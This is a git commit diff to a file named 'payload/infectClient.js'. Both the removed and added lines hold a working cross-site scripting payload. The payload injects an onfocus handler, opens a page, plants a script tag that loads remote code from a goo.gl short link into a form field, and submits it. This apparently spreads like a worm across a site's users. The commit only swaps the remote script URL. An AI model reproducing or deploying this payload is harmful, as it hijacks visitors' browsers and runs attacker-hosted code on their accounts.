f99606250a2c2edb662ba603475b56f3489ae1ae
theultraman20 <32559038+theultraman20@users.noreply.github.com>
2018-03-07 22:53:55 -0500

    Update infectClient.js

--- payload/infectClient.js
+++ payload/infectClient.js
@@ -1,1 +1,1 @@
-"onfocus="w=open($('a')[4].href);w.onload=function(){w.$('input')[8].value='<script/src=//goo.gl/NRLGFv>';w.$('.blue').click()}
+"onfocus="w=open($('a')[4].href);w.onload=function(){w.$('input')[8].value='<script/src=//goo.gl/PHPvuT>';w.$('.blue').click()}
